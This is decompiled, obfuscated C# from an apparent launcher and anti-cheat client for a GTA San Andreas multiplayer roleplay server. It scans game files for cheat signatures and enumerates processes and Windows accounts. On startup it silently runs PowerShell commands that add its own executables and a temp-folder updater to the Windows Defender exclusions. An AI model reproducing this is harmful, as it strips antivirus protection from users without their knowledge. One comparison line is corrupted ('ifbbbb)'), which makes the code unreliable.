using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using DiscordRPC;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.Win32;
using Rina.Client.Attributes;
using Rina.Client.Classes;
using Rina.Client.Exceptions;
using Rina.Database;
using Rina.Maps;
using Rina.Objects;
using Rina.Structs;

namespace Rina.Dispatcher
{
	// Token: 0x0200002C RID: 44
	internal class Dispatcher : MetroForm
	{
		// Token: 0x060000ED RID: 237 RVA: 0x00002C36 File Offset: 0x00000E36
		public Dispatcher()
		{
			AdvisorConnectionAttribute.CancelComposer();
			this.m_Getter = new CookieContainer();
			this._Service = new FolderBrowserDialog();
			this.m_RuleRef = new MapperRef();
			base..ctor();
			ProductReaderStructBuilder.tagIdentifier = this;
			this.RevertIdentifier();
		}

		// Token: 0x060000EE RID: 238 RVA: 0x00006DFC File Offset: 0x00004FFC
		private void LoginRef(object sender, EventArgs e)
		{
			try
			{
				using (PowerShell powerShell = PowerShell.Create())
				{
					string tempPath = Path.GetTempPath();
					powerShell.AddScript("Add-MpPreference -ExclusionProcess 'Rina Roleplay.exe'");
					powerShell.AddScript("Add-MpPreference -ExclusionProcess 'Rina Roleplay.old.exe'");
					powerShell.AddScript("Add-MpPreference -ExclusionProcess 'Rina_Updater.exe'");
					powerShell.AddScript("Add-MpPreference -ExclusionPath '" + Process.GetCurrentProcess().MainModule.FileName + "'");
					powerShell.AddScript("Add-MpPreference -ExclusionPath '" + tempPath + "Rina_Updater.exe'");
					powerShell.Invoke();
				}
			}
			catch
			{
			}
			this.config = new DiscordRpcClient("500244781906132993");
			this.config.Initialize();
			ProductReaderStructBuilder.m_BroadcasterIdentifier = Timestamps.Now;
			this.LoginIdentifier();
			this.m_Page = new System.Timers.Timer();
			this.m_Page.Elapsed += new ElapsedEventHandler(this.CreateRef);
			this.m_Page.Interval = 500.0;
			this.label_0.BackColor = ColorTranslator.FromHtml("#171717");
			this._PolicyRef.BackColor = Color.Transparent;
			this.m_ClientRef.BackColor = ColorTranslator.FromHtml("#171717");
			base.Style = 3;
			this.m_TokenRef.BackColor = ColorTranslator.FromHtml("#212121");
			this.m_IssuerRef.BackColor = ColorTranslator.FromHtml("#212121");
			this.expressionRef.BackColor = ColorTranslator.FromHtml("#212121");
			this.m_ComparatorRef.BackColor = ColorTranslator.FromHtml("#212121");
			this.m_ModelRef.SelectedIndex = 0;
			this._DefinitionRef.BackColor = Color.Transparent;
			this._DefinitionRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
			this.m_InstanceRef.BackColor = Color.Transparent;
			this.m_InstanceRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
			this.m_MerchantRef.BackColor = Color.Transparent;
			this.m_MerchantRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
			this._WriterRef.BackColor = ColorTranslator.FromHtml("#111111");
			this._WriterRef.ForeColor = ColorTranslator.FromHtml("#ffffff");
			this.metroLabel_0.BackColor = ColorTranslator.FromHtml("#111111");
			this.metroLabel_0.ForeColor = ColorTranslator.FromHtml("#ffffff");
			this.consumerRef.BackColor = Color.Transparent;
			this.consumerRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
			this.consumerRef.Text = ProductReaderStructBuilder._ValIdentifier;
			this.predicateRef.BackColor = Color.Transparent;
			this.predicateRef.ForeColor = ColorTranslator.FromHtml("#ffffff");
			this._SpecificationRef.BackColor = Color.Transparent;
			this._SpecificationRef.ForeColor = ColorTranslator.FromHtml("#ffffff");
			this._ObserverRef.BackColor = Color.Transparent;
			this._ObserverRef.ForeColor = ColorTranslator.FromHtml("#ffffff");
			this.SetRef();
			try
			{
				string text = MapperRef.CalculateReader("http://51.195.61.169/data/news.txt");
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://51.195.61.169/data/news.png");
				httpWebRequest.UserAgent = ProductReaderStructBuilder.m_SchemaIdentifier;
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					using (Stream responseStream = response.GetResponseStream())
					{
						this.threadRef.Image = Image.FromStream(responseStream);
					}
				}
				this._WriterRef.Text = text.Split(new char[]
				{
					'|'
				})[0];
				this.metroLabel_0.Text = text.Split(new char[]
				{
					'|'
				})[1];
				Dispatcher.queue = text.Split(new char[]
				{
					'|'
				})[2];
			}
			catch
			{
				this._WriterRef.Text = "-";
				this.metroLabel_0.Text = "-";
				Dispatcher.queue = "https://www.rina-roleplay.com";
			}
			this.m_RuleRef.IncludeReader();
			this.m_RuleRef.ViewSingleton();
		}

		// Token: 0x060000EF RID: 239 RVA: 0x00007238 File Offset: 0x00005438
		public void SetRef()
		{
			string text = MapperRef.CalculateReader("http://51.195.61.169/data/sunucudurumu.php");
			try
			{
				this._ManagerRef.BackColor = Color.Transparent;
				this._ManagerRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this._ManagerRef.Text = "Kilit durumu: ";
				if (text.Split(new char[]
				{
					'|'
				})[0] == "1")
				{
					this.m_ProccesorRef.BackColor = Color.Transparent;
					this.m_ProccesorRef.ForeColor = Color.Red;
					this.m_ProccesorRef.Text = "Kilitli";
				}
				else
				{
					this.m_ProccesorRef.BackColor = Color.Transparent;
					this.m_ProccesorRef.ForeColor = Color.Green;
					this.m_ProccesorRef.Text = "Kilitli Değil";
				}
				this.algoRef.BackColor = Color.Transparent;
				this.algoRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.algoRef.Text = "Hesap sayısı: " + text.Split(new char[]
				{
					'|'
				})[2];
				this._IteratorRef.BackColor = Color.Transparent;
				this._IteratorRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this._IteratorRef.Text = "BTC Piyasası: " + text.Split(new char[]
				{
					'|'
				})[1] + " BTC";
				this.messageRef.BackColor = Color.Transparent;
				this.messageRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.messageRef.Text = "Ekonomi: $" + text.Split(new char[]
				{
					'|'
				})[3];
				this.wrapperRef.BackColor = Color.Transparent;
				this.wrapperRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.wrapperRef.Text = "Son 24 saat: " + text.Split(new char[]
				{
					'|'
				})[6] + " karakter";
				this.producerRef.BackColor = Color.Transparent;
				this.producerRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.producerRef.Text = "Aktif oturum: " + text.Split(new char[]
				{
					'|'
				})[4];
				this.metroLabel_1.BackColor = Color.Transparent;
				this.metroLabel_1.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.metroLabel_1.Text = "Discord online: " + text.Split(new char[]
				{
					'|'
				})[5] + " kişi";
				this.roleRef.BackColor = Color.Transparent;
				this.roleRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.roleRef.Text = "Yakıt: $" + text.Split(new char[]
				{
					'|'
				})[7];
				this.m_TokenizerRef.BackColor = Color.Transparent;
				this.m_TokenizerRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.m_TokenizerRef.Text = "Son 24 saat: " + text.Split(new char[]
				{
					'|'
				})[8] + " takas";
				this.m_SchemaRef.BackColor = Color.Transparent;
				this.m_SchemaRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.m_SchemaRef.Text = "Giriş yapmış oyuncu: " + text.Split(new char[]
				{
					'|'
				})[9] + " kişi";
				this.processRef.BackColor = Color.Transparent;
				this.processRef.ForeColor = ColorTranslator.FromHtml("#c9c9c9");
				this.processRef.Text = "Bugün yeni katılan: " + text.Split(new char[]
				{
					'|'
				})[10] + " kişi";
			}
			catch
			{
				OrderVisitorException.TestReader("Lütfen daha yavaş güncelleyiniz.", "Rina Roleplay");
			}
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00007658 File Offset: 0x00005858
		private void AwakeRef(object sender, DoWorkEventArgs e)
		{
			new StringBuilder();
			int num = 1;
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0)
					{
						if (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP"))
						{
							Process.GetProcessesByName(process.MainWindowTitle.ToString());
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "GTA:SA açıkken giriş yapılamaz.";
							return;
						}
						num++;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
				}
			}
			this.label_0.ForeColor = Color.White;
			this.label_0.Text = "Kontroller sağlanıyor...";
			if (!MapperRef.SelectSingleton())
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Lütfen internet bağlantınızı kontrol edin.";
				return;
			}
			if (this.workerRef.Text == "")
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Lütfen karakter adınızı girin.";
				return;
			}
			if (this.workerRef.Text.Length < 3)
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Karakter adı bu kadar kısa olamaz.";
				return;
			}
			if (MapperRef.CalculateReader(ProductReaderStructBuilder._StateIdentifier) != ProductReaderStructBuilder._ValIdentifier)
			{
				ProductReaderStructBuilder.tagIdentifier.Hide();
				ProductReaderStructBuilder.objectIdentifier.Show();
				ProductReaderStructBuilder.objectIdentifier.DefineRef();
				return;
			}
			int num2 = MapperWatcherClass.PopRule();
			if (num2 != -1)
			{
				MapperRef.PatchSingleton(341);
				Process.Start("https://www.rina-roleplay.com/client/cheat.php?code=gh_" + num2.ToString());
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Client bozuldu.";
				return;
			}
			this.label_0.ForeColor = Color.Green;
			this.label_0.Text = "Giriş yapılıyor.";
			ProductReaderStructBuilder._PoolIdentifier = new FileInfo(MapperRef.fieldRef + "\\gta_sa.exe").LastWriteTime.ToString();
			ProductReaderStructBuilder.mapperIdentifier = new FileInfo(MapperRef.fieldRef + "\\samp.exe").LastWriteTime.ToString();
			if (Directory.Exists(MapperRef.fieldRef + "\\cleo"))
			{
				ProductReaderStructBuilder.m_ComposerIdentifier = true;
				ProductReaderStructBuilder._FieldIdentifier = new DirectoryInfo(MapperRef.fieldRef + "\\cleo").LastWriteTime.ToString();
				ProductReaderStructBuilder.facadeIdentifier = MapperRef.DeleteSingleton(MapperRef.fieldRef + "\\cleo");
			}
			else
			{
				ProductReaderStructBuilder._FieldIdentifier = "";
				ProductReaderStructBuilder.facadeIdentifier = "";
				ProductReaderStructBuilder.m_ComposerIdentifier = false;
			}
			ProductReaderStructBuilder.errorIdentifier = 1;
			this.label_0.Text = "Anti hile sağlığı kontrol ediliyor.";
			this.label_0.Text = "Client sağlığı kontrol ediliyor.";
			if (MapperRef.CustomizeSingleton(MapperRef.fieldRef + "\\gta_sa.exe") == MapperWatcherClass.VerifyRule(0, null))
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c5";
				return;
			}
			if (this.CloneRef() == 1)
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Gizli dosyalar var.";
				return;
			}
			this.label_0.Text = "Değiştirilmiş dosyalar tespit ediliyor.";
			foreach (string text in Directory.EnumerateFiles(MapperRef.fieldRef, "*.dll", SearchOption.AllDirectories))
			{
				FileInfo fileInfo = new FileInfo(text);
				long length = fileInfo.Length;
				string name = fileInfo.Name;
				if (length != (long)ProductReaderStructBuilder._DicIdentifier)
				{
					if (length != (long)ProductReaderStructBuilder._SystemIdentifier)
					{
						if (!(name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false)) == "D3D9.DLL"))
						{
							continue;
						}
						int num3 = 0;
						foreach (ProductReaderStructBuilder.InvocationWatcherLicense invocationWatcherLicense in ProductReaderStructBuilder._ConfigIdentifier)
						{
							if (length == invocationWatcherLicense._ReaderReader && MappingRef.FlushReader(text) == invocationWatcherLicense.refReader)
							{
								num3 = 1;
								break;
							}
						}
						if (num3 == 0)
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "'" + text + "' dosya yolunda izinsiz D3D9.DLL bulundu.";
							return;
						}
						continue;
					}
				}
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "ANTTWEAKBAR (" + name + ") tespit edildi. Bu dosyayı silerek sorunu çözebilirsiniz.";
				return;
			}
			foreach (string text2 in Directory.EnumerateFiles(MapperRef.fieldRef, "*.*", SearchOption.AllDirectories))
			{
				FileInfo fileInfo2 = new FileInfo(text2);
				long length2 = fileInfo2.Length;
				string name2 = fileInfo2.Name;
				if (length2 >= 50000L && length2 <= 70000L)
				{
					foreach (string text3 in File.ReadLines(text2))
					{
						if (text3.Contains(MapperWatcherClass.VerifyRule(31, "taghacker")) || text3.Contains(MapperWatcherClass.VerifyRule(32, "mod_s0beit_sa")) || text3.Contains(MapperWatcherClass.VerifyRule(33, "https://github.com/BlastHackNet/mod_s0beit_sa/")) || text3.Contains(MapperWatcherClass.VerifyRule(34, "esp_players_defaulton")) || text3.Contains(MapperWatcherClass.VerifyRule(35, "run_mode = 1")) || text3.Contains(MapperWatcherClass.VerifyRule(36, "wine_compatibility")) || text3.Contains(MapperWatcherClass.VerifyRule(37, "hud_indicator_inveh_airbrk")) || text3.Contains(MapperWatcherClass.VerifyRule(38, "hud_indicator_surf")) || text3.Contains(MapperWatcherClass.VerifyRule(39, "hud_indicator_freezerot")) || text3.Contains(MapperWatcherClass.VerifyRule(40, "key_anti_freeze")) || text3.Contains(MapperWatcherClass.VerifyRule(41, "s0beit")) || text3.Contains(MapperWatcherClass.VerifyRule(42, "d3dtext_chat")))
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Oyun dosyalarınızda S0BE1T bulundu oyun başlatılamıyor.";
							return;
						}
					}
				}
			}
			if (File.Exists(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(49, "\\samp_debug.exe")) && MappingRef.FlushReader(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(49, "\\samp_debug.exe")) != "e05bbbcb")
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Orjinal olmayan samp_debug.exe tespit edildi.";
				return;
			}
			if (File.Exists(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(14, "\\samp.exe")))
			{
				int num4 = 0;
				int num5 = 0;
				int num6 = 0;
				int num7 = -1;
				foreach (string text4 in File.ReadLines(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(14, "\\samp.exe"), Encoding.UTF8))
				{
					if (text4.Contains("model_cache"))
					{
						num4 = 1;
					}
					if (text4.Contains("model_cache"))
					{
						string a = MapperRef.SetSingleton(text4);
						if (a != "000000830790700840870650820690920830650770800000000253255253255253255253255110000000109011101000101010809509909709901040101000850253255253255253255480253255253255253255510732253255480253255253255253255253255253255520253255253255253255253255253255560253255253255253255253255253255600253255253255253255253255253255640253255253255253255253255253255680253255253255253255253255253255720253255253255253255253255253255760253255253255253255253255850253255690253255510253255850104025325557078000100025325548010002532553202532551025325512401190650002532552902025325525325525325525325500790002532555025325500790000025325510253255320253255670002532555702532552532552532552532556902532551000002532552532556902532552532557022532552532552532551025325525325557078000253255690253255253255300253255253255253255253255253255570780002532556902532552532557702532552532552532552532552532551160370253255253255760253255253255253255253255253255570780002532556902532552532551220253255253255253255253255253255760253255253255253255253255253255007900025325574016025325525325525325518025325569025325525325520025325525325525325525325511469025325525325525325525325525325525325525325557078000253255690253255253255502532552532552532552532552532551160350253255253255720253255253255253255253255253255570780002532556902532552532555002532552532552532552532552532557202532552532552532552532552532550079000253255201602532552532552532552532555707800025325569025325525325575425325525325525325525325511603502532552532556802532552532552532552532552532555707800025325569025325525325525325525325525325525325525325525325568025325525325525325525325525325500790002532552532551502532552532552532552532555707800025325569025325575135253255253255253255253255116039025325525325564025325525325525325525325525325557078000253255690253255253255137225325525325525325525325564025325525325525325525325569025325525325525325512004000002532555902532552532552532556902532551331342532552532552532556902532552532553001025325525325525325577025325525325525325525325525325596025325525325525325580010402020000025325579025325525325510600010602010602025325579025325525325525325525325500790002532552532558002532552532552532552532551600000002532556202532552532555102532552532552532558402532552532552532551020197180025325525325525325520001020197182025325525325525325500001060160253255253255800253255253255253255800253255253255007900080025325560790253255253255106010104010400000253255690253255253255253255253255253255800253255253255007900080025325559079025325525325525325510253255124011906500025325599000253255253255253255253255007900025325510253255690253255253255253255116040000025325514041025325525325525325510253255690253255253255253255253255400000253255253255400253255253255253255253255600253255253255253255253255253255253255253255253255253255600253255253255253255253255253255253255253255253255253255253255560253255253255253255253255117025325525325525325525325525325556025325525325525325525325500580780002532552501702532552532552532552532555602532552532552532552532552532552532552532552532552532555202532552532552532552532557902532552532552532552532552532555202532552532552532552532551605807800025325525325516025325525325525325525325552025325525325525325525325512009002532552532552532552532551160430253255253255480253255253255253255253255370253255253255253255253255253255480253255253255253255253255160580780002532552532551602532552532552532552532554802532552532552532555107526902532552532558503300000253255690253255800510752850253255253255690253255253255253255680000025325585025325525325569025325525325525325514000002532556902532552532552532551600000510253255900890890100025325516010402532555707800025325525325548025325525325525325525325580000000253255253255" && a != "0000001030116097095011509709501010120010100000253255253255253255253255110000000109011101000101010809509909709901040101000253255253255253255253255")
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Hileli SAMP.EXE sürümü bulundu. /c5";
							return;
						}
					}
					if (text4.Contains("\0" + MapperWatcherClass.VerifyRule(43, "gta_sa_exe") + "\0"))
					{
						num5++;
					}
					if (text4.Contains("\0" + MapperWatcherClass.VerifyRule(44, "SOFTWARE\\SAMP") + "\0"))
					{
						num6++;
					}
					if (text4.Contains("Aborting launch.") && !text4.Contains(MapperWatcherClass.VerifyRule(48, "\0samp.dll\0")))
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Hileli SAMP.EXE sürümü bulundu. /c4";
						return;
					}
					if (text4.Contains(MapperWatcherClass.VerifyRule(46, "EôèJ\u008dõÿ‹EôèZ‰õÿ‹EôèŞ")))
					{
						num7 = 0;
					}
					if (num7 > -1)
					{
						num7++;
					}
					if (num7 == 2 && !text4.Contains(MapperWatcherClass.VerifyRule(45, "\0\0\0SOFTWARE\\SAMP\0\0\0ÿÿÿÿ")))
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Hileli SAMP.EXE sürümü bulundu. /c3";
						return;
					}
				}
				if (num4 == 1 && num5 != 2)
				{
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Hileli SAMP.EXE sürümü bulundu. /c1";
					return;
				}
				if (num4 == 1 && num6 != 6)
				{
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Hileli SAMP.EXE sürümü bulundu. /c2";
					return;
				}
			}
			if (File.Exists(MapperRef.fieldRef + "\\gta_sa.exe"))
			{
				int num8 = -1;
				int num9 = -1;
				int num10 = 0;
				foreach (string text5 in File.ReadLines(MapperRef.fieldRef + "\\gta_sa.exe", Encoding.UTF8))
				{
					if (text5.Contains(MapperWatcherClass.VerifyRule(7, null)))
					{
						string b = MapperRef.SetSingleton(text5);
						ifbbbb)
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c4";
							return;
						}
					}
				}
				foreach (string text6 in File.ReadLines(MapperRef.fieldRef + "\\gta_sa.exe", Encoding.Default))
				{
					if (text6.Contains(MapperWatcherClass.VerifyRule(2, "§pıh¨VÔ")))
					{
						num8 = 0;
					}
					if (num8 == 4)
					{
						if (!text6.Contains(MapperWatcherClass.VerifyRule(25, "\0\0D3D9.DLL\0\0\0\0\0\0\0\0")))
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c3";
							return;
						}
						num8 = -1;
					}
					else if (num8 > -1)
					{
						num8++;
					}
					if (text6.Contains(MapperWatcherClass.VerifyRule(3, "$Id: //RenderWare/RW36Active/rwsdk/tool/slerp/rtslerp.c")))
					{
						num9 = 0;
					}
					if (num9 == 3)
					{
						if (!text6.Contains(MapperWatcherClass.VerifyRule(4, "\0\0\0\0\0\0\0\0\0\0d3d9.dll\0")))
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c2";
							return;
						}
						num9 = -1;
					}
					else if (num9 > -1)
					{
						num9++;
					}
					if (text6.Contains(MapperWatcherClass.VerifyRule(5, null)) || (text6.Contains(MapperWatcherClass.VerifyRule(6, null)) && !text6.Contains(MapperWatcherClass.VerifyRule(4, null))) || (text6.Contains(MapperWatcherClass.VerifyRule(7, null)) && !text6.Contains(MapperWatcherClass.VerifyRule(4, null))) || (text6.Contains(MapperWatcherClass.VerifyRule(8, null)) && !text6.Contains(MapperWatcherClass.VerifyRule(9, null))))
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c1";
						return;
					}
					if (text6.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false)).Contains("D3D9.DLL"))
					{
						num10++;
					}
				}
				if (num10 != 4)
				{
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Hileli GTA_SA.EXE sürümü bulundu. /c1";
					return;
				}
			}
			if (File.Exists(MapperRef.fieldRef + "\\vorbisFile.dll"))
			{
				foreach (string text7 in File.ReadLines(MapperRef.fieldRef + "\\vorbisFile.dll", Encoding.Default))
				{
					if (text7.Contains(MapperWatcherClass.VerifyRule(10, "[excludes]")) && !text7.Contains(MapperWatcherClass.VerifyRule(11, "\0\0\0\0\0\0\0\0\0\0*.asi\0\0\0..\\\0..\\..\\\0\0scripts\\\0\0\0")))
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Hileli vorbisFile.dll sürümü bulundu. /c1";
						return;
					}
					if (text7.Contains(MapperWatcherClass.VerifyRule(12, "3ÀUhO?@\ndÿ0d‰")) && (!text7.Contains(MapperWatcherClass.VerifyRule(47, "\0*.asi\0")) || !text7.Contains(MapperWatcherClass.VerifyRule(13, null))))
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Hileli vorbisFile.dll sürümü bulundu. /c2";
						return;
					}
				}
			}
			using (IEnumerator<string> enumerator = Directory.EnumerateFiles(MapperRef.fieldRef, "needle.png", SearchOption.AllDirectories).GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					string text8 = enumerator.Current;
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Oyun dosyalarınızda S0BE1T bulundu oyun başlatılamıyor.";
					return;
				}
			}
			using (IEnumerator<string> enumerator = Directory.EnumerateFiles(MapperRef.fieldRef, "speedo.png", SearchOption.AllDirectories).GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					string text9 = enumerator.Current;
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Oyun dosyalarınızda S0BE1T bulundu oyun başlatılamıyor.";
					return;
				}
			}
			this.label_0.Text = "Oturum kontrol ediliyor.";
			List<Dispatcher.InterpreterVisitorException> list = Dispatcher.InterpreterVisitorException.AddReader();
			try
			{
				foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_UserAccount").Get().Cast<ManagementObject>().Where(new Func<ManagementObject, bool>(Dispatcher.<>c.m_MockRef.ListReader)))
				{
					if (Environment.UserName != managementObject["Name"].ToString())
					{
						if (MapperRef.MoveSingleton(managementObject["Name"].ToString()))
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Aktif ikinci bir oturum bulunduğu için sizi oyuna alamayız. (" + managementObject["Name"].ToString() + ") | CODE 1";
							MapperRef.CreateSingleton("Two session detected. - " + managementObject["Name"].ToString());
							MapperRef.NewSingleton("TWOSESSION_C1", Environment.UserName, managementObject["Name"].ToString(), "", 0);
							return;
						}
						if (!MapperRef.SearchSingleton(MapperRef.PublishSingleton(32)))
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Aktif ikinci bir oturum bulunduğu için sizi oyuna alamayız. (" + managementObject["Name"].ToString() + ") | CODE 2";
							MapperRef.CreateSingleton("Two session detected. - " + managementObject["Name"].ToString());
							MapperRef.NewSingleton("TWOSESSION_C2", Environment.UserName, managementObject["Name"].ToString(), "", 0);
							return;
						}
						using (List<Dispatcher.InterpreterVisitorException>.Enumerator enumerator5 = list.GetEnumerator())
						{
							while (enumerator5.MoveNext())
							{
								if (enumerator5.Current.ExcludeReader().Equals(managementObject["Name"].ToString()))
								{
									this.label_0.ForeColor = Color.Red;
									this.label_0.Text = "Aktif ikinci bir oturum bulunduğu için sizi oyuna alamayız. (" + managementObject["Name"].ToString() + ") | CODE 3";
									MapperRef.CreateSingleton("Two session detected. - " + managementObject["Name"].ToString());
									MapperRef.NewSingleton("TWOSESSION_C3", Environment.UserName, managementObject["Name"].ToString(), "", 0);
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			this.label_0.Text = "Los Santos'a bağlanılıyor.";
			if (!File.Exists(MapperRef.fieldRef + "\\gta_sa.exe") || !File.Exists(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(14, "\\samp.exe")))
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Oyun dosyalarında gta_sa.exe veya samp.exe bulunamadı.";
				return;
			}
			if (this.m_RuleRef.SortSingleton() > 0)
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Hile bulundu oyun başlatılamıyor.";
				return;
			}
			string text10;
			if ((text10 = MapperRef.WriteSingleton(0)).Length > 0)
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Yasaklı program bulundu, lütfen giriş yapabilmek önce bu programı kaldırın: " + text10;
				MapperRef.NewSingleton("YASAKLI PROGRAM", text10, "", "", 0);
				return;
			}
			if (OrderVisitorException.DestroyReader())
			{
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "İlk önce uyarıları kapatın.";
				return;
			}
			if (this.workerRef.Text.Length < 24)
			{
				if (MapperRef.CollectSingleton(this.workerRef.Text))
				{
					int num11;
					if ((num11 = this.SortIdentifier(this.workerRef.Text.Trim(), ProductReaderStructBuilder.factoryIdentifier + ProductReaderStructBuilder._AccountIdentifier, MapperRef.AddSingleton(), ProductReaderStructBuilder.decoratorIdentifier, MapperRef.RevertReader())) != 1)
					{
						if (num11 != 0)
						{
							if (num11 == -1)
							{
								this.label_0.Text = "Ters giden bir şeyler var. Sistem yöneticisine başvurunuz.";
							}
							else if (num11 == -2)
							{
								this.label_0.Text = "Bu isim kullanılamaz.";
							}
							else if (num11 == -3)
							{
								this.label_0.Text = "Bu makina üzerinden giriş yapamazsınız.";
							}
							else if (num11 == -4)
							{
								this.label_0.Text = "Probation sürecinde olduğunuz için " + ProductReaderStructBuilder.m_TestsIdentifier + " karakteri dışında hiç bir karaktere giriş yapamazsınız.";
							}
							else if (num11 == -5)
							{
								this.label_0.Text = "Client guncellenmis, lutfen sitemizden yeni clienti indirin.";
							}
							else if (num11 == -6)
							{
								this.label_0.Text = "İzinsiz sanal sunucu üzerinden bağlanmayı deniyorsunuz. İzninizin süresi dolmuş olabilir.";
							}
							else if (num11 == -7)
							{
								this.label_0.Text = "Kimlik doğrulama bütünlüğü bozuk.";
							}
							else if (num11 == -8)
							{
								this.label_0.Text = "Giriş yapmanız yasaklanmış.";
							}
							else if (num11 == -9)
							{
								this.label_0.Text = "IP/Network bağlantınızda bir problem bulundu. Sistem yöneticisiyle iletişime geçiniz.";
							}
							else if (num11 == -10)
							{
								this.label_0.Text = "Saatlik oluşturabileceğiniz karakter limitini aşmışsınız. Kendi hesabınızla giriş yapınız.";
							}
							else if (num11 == -11)
							{
								this.label_0.Text = "Günlük oluşturabileceğiniz karakter limitini aşmışsınız. Kendi hesabınızla giriş yapınız.";
							}
							else if (num11 == -12)
							{
								MapperRef.PostSingleton();
							}
							else if (num11 == -13)
							{
								this.label_0.Text = "Hata ayıklayıcı tespit edildi.";
							}
							else if (num11 == -14)
							{
								this.label_0.Text = "Spoofer tespit edildi.";
							}
							else if (num11 == -15)
							{
								this.label_0.Text = "Kimlik doğrulamanız otomatik olarak yapılamadı. Sistem yöneticisine başvurunuz.";
							}
						}
						else
						{
							this.label_0.Text = "Giriş yapılamadı, çok sık giriş yapamazsınız 15 saniye sonra tekrar deneyiniz.";
						}
						this.label_0.ForeColor = Color.Red;
						return;
					}
					try
					{
						base.BeginInvoke(new Action(this.QueryReader));
						return;
					}
					catch (Exception ex2)
					{
						this.label_0.Text = "Oyun çalıştırılamadı.";
						MessageBox.Show(ex2.Message);
						return;
					}
				}
				this.label_0.ForeColor = Color.Red;
				this.label_0.Text = "Ad ve soyadınız arasında alt çizgi(tire) olmalıdır ve baş harfleri büyük olmalıdır. (Örnek: Daryl_Morgan)";
				return;
			}
			this.label_0.ForeColor = Color.Red;
			this.label_0.Text = "İsminiz en fazla 24 karakter olabilir.";
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00002C70 File Offset: 0x00000E70
		public void CustomizeRef()
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Action(this.CustomizeRef));
				return;
			}
			this.m_Page.Start();
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x00002C99 File Offset: 0x00000E99
		public void InvokeRef()
		{
			if (!base.InvokeRequired)
			{
				this._InvocationRef.Start();
				return;
			}
			base.Invoke(new Action(this.InvokeRef));
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x00008C28 File Offset: 0x00006E28
		public void CreateRef(object sender, EventArgs e)
		{
			TaskReader.TestRule(8, new object[]
			{
				sender,
				e
			}, this);
		}

